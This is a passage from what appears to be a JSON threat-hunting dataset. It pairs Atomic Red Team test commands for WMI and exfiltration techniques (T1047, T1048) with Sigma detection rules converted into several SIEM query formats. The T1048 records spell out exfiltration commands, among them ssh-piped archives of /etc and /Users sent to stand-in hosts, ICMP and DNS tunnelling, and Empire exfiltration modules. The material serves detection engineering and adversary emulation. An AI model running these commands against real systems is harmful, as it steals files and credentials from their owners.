}\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4624\" AND ProcessName.keyword:*\\\\\\\\WmiPrvSE.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4624\" ProcessName=\"*\\\\\\\\WmiPrvSE.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4624\" ProcessName=\"*\\\\\\\\WmiPrvSE.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4624)(?=.*.*\\\\WmiPrvSE\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WMI Persistence\nid: 0b7889b4-5577-4521-a60a-3376ee7f9f7b\nstatus: experimental\ndescription: Detects suspicious WMI event filter and command line event consumer based on event id 5861 and 5859 (Windows 10, 2012 and higher)\nauthor: Florian Roth\nreferences:\n    - https://twitter.com/mattifestation/status/899646620148539397\n    - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1047\nlogsource:\n    product: windows\n    service: wmi\ndetection:\n    selection:\n        EventID: 5861\n    keywords:\n        Message:\n            - '*ActiveScriptEventConsumer*'\n            - '*CommandLineEventConsumer*'\n            - '*CommandLineTemplate*'\n        # - 'Binding EventFilter'  # too many false positive with HP Health Driver\n    selection2:\n        EventID: 5859\n    condition: selection and 1 of keywords or selection2\nfalsepositives:\n    - Unknown (data set is too small; further testing needed)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WMI Persistence\nid: 0b7889b4-5577-4521-a60a-3376ee7f9f7b\nstatus: experimental\ndescription: Detects suspicious WMI event filter and command line event consumer based on event id 5861 and 5859 (Windows 10, 2012 and higher)\nauthor: Florian Roth\nreferences:\n    - https://twitter.com/mattifestation/status/899646620148539397\n    - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1047\nlogsource:\n    product: windows\n    service: wmi\ndetection:\n    selection:\n        EventID: 5861\n    keywords:\n        Message:\n            - '*ActiveScriptEventConsumer*'\n            - '*CommandLineEventConsumer*'\n            - '*CommandLineTemplate*'\n        # - 'Binding EventFilter'  # too many false positive with HP Health Driver\n    selection2:\n        EventID: 5859\n    condition: selection and 1 of keywords or selection2\nfalsepositives:\n    - Unknown (data set is too small; further testing needed)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"5861\" AND Message.keyword:(*ActiveScriptEventConsumer* OR *CommandLineEventConsumer* OR *CommandLineTemplate*)) OR EventID:\"5859\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WMI-Persistence <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WMI Persistence\",\\n    \"description\": \"Detects suspicious WMI event filter and command line event consumer based on event id 5861 and 5859 (Windows 10, 2012 and higher)\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.persistence\",\\n      \"attack.t1047\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"5861\\\\\" AND Message.keyword:(*ActiveScriptEventConsumer* OR *CommandLineEventConsumer* OR *CommandLineTemplate*)) OR EventID:\\\\\"5859\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"5861\\\\\" AND Message.keyword:(*ActiveScriptEventConsumer* OR *CommandLineEventConsumer* OR *CommandLineTemplate*)) OR EventID:\\\\\"5859\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WMI Persistence\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"5861\" AND Message.keyword:(*ActiveScriptEventConsumer* *CommandLineEventConsumer* *CommandLineTemplate*)) OR EventID:\"5859\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"5861\" (Message=\"*ActiveScriptEventConsumer*\" OR Message=\"*CommandLineEventConsumer*\" OR Message=\"*CommandLineTemplate*\")) OR EventID=\"5859\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"5861\" Message IN [\"*ActiveScriptEventConsumer*\", \"*CommandLineEventConsumer*\", \"*CommandLineTemplate*\"]) OR event_id=\"5859\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*5861)(?=.*(?:.*.*ActiveScriptEventConsumer.*|.*.*CommandLineEventConsumer.*|.*.*CommandLineTemplate.*)))|.*5859))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WMI Persistence - Script Event Consumer\nid: ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e\nstatus: experimental\ndescription: Detects WMI script event consumers\nreferences:\n    - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\nauthor: Thomas Patzke\ndate: 2018/03/07\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: C:\\WINDOWS\\system32\\wbem\\scrcons.exe\n        ParentImage: C:\\Windows\\System32\\svchost.exe\n    condition: selection\nfalsepositives:\n    - Legitimate event consumers\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WMI Persistence - Script Event Consumer\nid: ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e\nstatus: experimental\ndescription: Detects WMI script event consumers\nreferences:\n    - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\nauthor: Thomas Patzke\ndate: 2018/03/07\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: C:\\WINDOWS\\system32\\wbem\\scrcons.exe\n        ParentImage: C:\\Windows\\System32\\svchost.exe\n    condition: selection\nfalsepositives:\n    - Legitimate event consumers\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image:\"C\\\\:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\scrcons.exe\" AND ParentImage:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WMI-Persistence---Script-Event-Consumer <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WMI Persistence - Script Event Consumer\",\\n    \"description\": \"Detects WMI script event consumers\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.persistence\",\\n      \"attack.t1047\"\\n    ],\\n    \"query\": \"(Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\wbem\\\\\\\\\\\\\\\\scrcons.exe\\\\\" AND ParentImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\svchost.exe\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\wbem\\\\\\\\\\\\\\\\scrcons.exe\\\\\" AND ParentImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\svchost.exe\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WMI Persistence - Script Event Consumer\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image:\"C\\\\:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\scrcons.exe\" AND ParentImage:\"C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\scrcons.exe\" ParentImage=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\scrcons.exe\" ParentImage=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons\\\\.exe)(?=.*C:\\\\Windows\\\\System32\\\\svchost\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: Create a remote process by wmic\ndescription: windows server 2016\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: system\ndetection:\nselection:\nEventID: 4688 # Process Creation\nNewprocessname: 'C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # creator process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: 'wmic.exe / node: * process *' # command-line process\ncondition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1048/T1048.yaml", "command": "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }\n", "name": null}, {"source": "atomics/T1048/T1048.yaml", "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exfiltration/exfil_dropbox", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exfiltration/exfil_dropbox", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "exfiltration/Invoke_ExfilDataToGitHub", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "exfiltration/Invoke_ExfilDataToGitHub", "name": "Empire Module Command"}], "command_list": ["ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'\n", "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'\n", "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'\n", "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }\n", "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }\n", "powershell/exfiltration/exfil_dropbox", "powershell/exfiltration/exfil_dropbox", "exfiltration/Invoke_ExfilDataToGitHub", "exfiltration/Invoke_ExfilDataToGitHub"], "technique_id": "T1048", "parsed_datasets": [{"Atomic Red Team Test - Exfiltration Over Alternative Protocol": {"display_name": "Exfiltration Over Alternative Protocol", "atomic_tests": [{"description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n", "supported_platforms": ["macos", "linux"], "name": "Exfiltration Over Alternative Protocol - SSH", "input_arguments": {"domain": {"default": "target.example.com", "type": "url", "description": "target SSH domain"}, "password": {"default": "atomic", "type": "string", "description": "password for user"}, "user_name": {"default": "atomic", "type": "string", "description": "username for domain"}}, "executor": {"elevation_required": false, "command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "name": "sh"}}, {"description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n", "supported_platforms": ["macos", "linux"], "name": "Exfiltration Over Alternative Protocol - SSH", "input_arguments": {"domain": {"default": "target.example.com", "type": "url", "description": "target SSH domain"}, "password": {"default": "atomic", "type": "string", "description": "password for user"}, "user_name": {"default": "atomic", "type": "string", "description": "username for domain"}}, "executor": {"elevation_required": false, "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n", "name": "sh"}}, {"description": "A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.\n", "supported_platforms": ["macos", "linux"], "name": "Exfiltration Over Alternative Protocol - HTTP", "executor": {"steps": "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n", "name": "manual"}}, {"description": "Exfiltration of specified file over ICMP protocol.\n", "supported_platforms": ["windows"], "name": "Exfiltration Over Alternative Protocol - ICMP", "input_arguments": {"ip_address": {"default": "127.0.0.1", "type": "String", "description": "Destination IP address where the data should be sent."}, "input_file": {"default": "C:\\Windows\\System32\\notepad.exe", "type": "Path", "description": "Path to file to be exfiltrated."}}, "executor": {"elevation_required": false, "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n", "name": "powershell"}}, {"description": "Exfiltration of specified file over DNS protocol.\n", "supported_platforms": ["linux"], "name": "Exfiltration Over Alternative Protocol - DNS", "input_arguments": {"domain": {"default": "ns2.example.com", "type": "url", "description": "target DNS domain"}, "output_file": {"default": "received_data.txt", "type": "String", "description": "Filename of the data exfiltrated."}, "input_file": {"default": "./example.txt", "type": "Path", "description": "Path to file to be exfiltrated."}}, "executor": {"steps": "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \".domain\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n    \n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r", "name": "manual"}}], "attack_technique": "T1048"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1048", "Empire Module": "powershell/exfiltration/exfil_dropbox", "Technique": "Exfiltration Over Alternative Protocol", "ATT&CK Technique #2": "T1071", "Concatenate for Python Dictionary": "\"powershell/exfiltration/exfil_dropbox\":  [\"T1048\",\"T1071\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1048", "Empire Module": "exfiltration/Invoke_ExfilDataToGitHub", "Technique": "Exfiltration Over Alternative Protocol", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"exfiltration/Invoke_ExfilDataToGitHub\":  [\"T1048\"],"}}], "queries": [{"query": "title: Dnscat execution\nid: a6d67db4-6220-436d-8afc-f3842fe05d43\ndescription: Dnscat exfiltration tool execution\nstatus: experimental\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection:\n        EventID: 4104\n        ScriptBlockText|contains: \"Start-Dnscat2\"\n    condition: selection\nfalsepositives:\n    - Legitimate usage of PowerShell Dnscat2 \u2014 DNS Exfiltration tool (unlikely)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Dnscat execution\nid: a6d67db4-6220-436d-8afc-f3842fe05d43\ndescription: Dnscat exfiltration tool execution\nstatus: experimental\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection:\n        EventID: 4104\n        ScriptBlockText|contains: \"Start-Dnscat2\"\n    condition: selection\nfalsepositives:\n    - Legitimate usage of PowerShell Dnscat2 \u2014 DNS Exfiltration tool (unlikely)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4104\" AND ScriptBlockText.keyword:*Start\\\\-Dnscat2*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Dnscat-execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Dnscat execution\",\\n    \"description\": \"Dnscat exfiltration tool execution\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1048\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4104\\\\\" AND ScriptBlockText.keyword:*Start\\\\\\\\-Dnscat2*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4104\\\\\" AND ScriptBlockText.keyword:*Start\\\\\\\\-Dnscat2*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Dnscat execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4104\" AND ScriptBlockText.keyword:*Start\\\\-Dnscat2*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4104\" ScriptBlockText=\"*Start-Dnscat2*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"4104\" ScriptBlockText=\"*Start-Dnscat2*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4104)(?=.*.*Start-Dnscat2.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: DNS exfiltration tools execution\nid: 98a96a5a-64a0-4c42-92c5-489da3866cb0\ndescription: Well-known DNS Exfiltration tools execution\nstatus: experimental\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '*\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of iodine or dnscat2 \u2014 DNS Exfiltration tools (unlikely)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: DNS exfiltration tools execution\nid: 98a96a5a-64a0-4c42-92c5-489da3866cb0\ndescription: Well-known DNS Exfiltration tools execution\nstatus: experimental\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '*\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of iodine or dnscat2 \u2014 DNS Exfiltration tools (unlikely)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\iodine.exe OR Image.keyword:*\\\\\\\\dnscat2*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/DNS-exfiltration-tools-execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"DNS exfiltration tools execution\",\\n    \"description\": \"Well-known DNS Exfiltration tools execution\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1048\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\iodine.exe OR Image.keyword:*\\\\\\\\\\\\\\\\dnscat2*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\iodine.exe OR Image.keyword:*\\\\\\\\\\\\\\\\dnscat2*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'DNS exfiltration tools execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\iodine.exe OR Image.keyword:*\\\\\\\\dnscat2*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\iodine.exe\" OR Image=\"*\\\\\\\\dnscat2*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\iodine.exe\" OR Image=\"*\\\\\\\\dnscat2*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.*\\\\iodine\\\\.exe|.*.*\\\\dnscat2.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "action: global\ntitle: Tap driver installation\nid: 8e4cf0e5-aa5d-4dc3-beff-dc26917744a9\ndescription: Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques\nstatus: experimental\nauthor: Daniil Yugoslavskiy, Ian Davis, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1048\nfalsepositives:\n    - Legitimate OpenVPN TAP insntallation\nlevel: medium\ndetection:\n    selection:\n        ImagePath|contains: 'tap0901'\n    condition: selection\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: Tap driver installation\nid: 8e4cf0e5-aa5d-4dc3-beff-dc26917744a9\ndescription: Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques\nstatus: experimental\nauthor: Daniil Yugoslavskiy, Ian Davis, oscd.community\ndate: 2019/10/24\ntags:\n    - attack.exfiltration\n    - attack.t1048\nfalsepositives:\n    - Legitimate OpenVPN TAP insntallation\nlevel: medium\ndetection:\n    selection:\n        ImagePath|contains: 'tap0901'\n    condition: selection\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"7045\" AND ImagePath.keyword:*tap0901*)\\n(EventID:\"6\" AND ImagePath.keyword:*tap0901*)\\n(EventID:\"4697\" AND ImagePath.keyword:*tap0901*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Tap-driver-installation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Tap driver installation\",\\n    \"description\": \"Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques\",\\n    \"tags\": [\\n      \"attack.exfiltration\",\\n      \"attack.t1048\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"7045\\\\\" AND ImagePath.keyword:*tap0901*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7045\\\\\" AND ImagePath.keyword:*tap0901*)\",\\n                    